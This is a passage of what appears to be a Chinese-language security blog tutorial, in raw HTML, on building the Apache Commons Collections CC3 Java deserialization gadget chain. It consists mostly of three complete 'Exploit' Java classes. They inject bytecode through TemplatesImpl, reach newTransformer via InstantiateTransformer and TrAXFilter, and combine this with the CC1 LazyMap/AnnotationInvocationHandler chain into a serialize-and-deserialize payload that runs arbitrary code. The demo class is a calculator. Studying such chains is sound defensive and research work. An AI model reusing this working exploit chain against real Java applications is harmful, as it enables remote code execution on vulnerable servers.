class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230126150608788.png"></p><h3 id="3-2-调用-newTransformer"><a href="#3-2-调用-newTransformer" class="headerlink" title="3.2 调用 newTransformer()"></a>3.2 调用 newTransformer()</h3><p>接下来就是寻找从哪里调用 newTransformer() 方法</p><p><img src="/../../../../../pic/image-20230126152347466.png"></p><p>在 TrAXFilter 的构造方法中进行了调用，所以接下来的就是寻找如何实例化该类，查找实例化该类的地方后都没办法进行进一步调用</p><p>这里就需要引入一个辅助类 InstantiateTransformer</p><p>通过名字大概知道该类是用来初始化 Transformer 的，进入查看一下如何实现初始化类的</p><p><img src="/../../../../../pic/image-20230126152941529.png"></p><p>直接获取输入类的构造函数然后返回实例化类</p><p>测试一下</p><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        instantiateTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> targetField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230126153724050.png"></p><p>接下来又回到了transform 的调用上，可以把 CC1 与 CC6 的链子拿过来用</p><h2 id="4-CC3-链-EXP-编写"><a href="#4-CC3-链-EXP-编写" class="headerlink" title="4. CC3 链 EXP 编写"></a>4. CC3 链 EXP 编写</h2><h3 id="4-1-使用-CC1-链前半部分"><a href="#4-1-使用-CC1-链前半部分" class="headerlink" title="4.1 使用 CC1 链前半部分"></a>4.1 使用 CC1 链前半部分</h3><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"rce"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                instantiateTransformer        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 LazyMap</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取 AnnotationInvocationHandler</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取构造方法</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过权限</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化为 InvocationHandler</span>        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置代理，</span>        <span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将代理写入到 memberValues，反序列化时触发 invoke</span>        handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Serialize</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newInputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 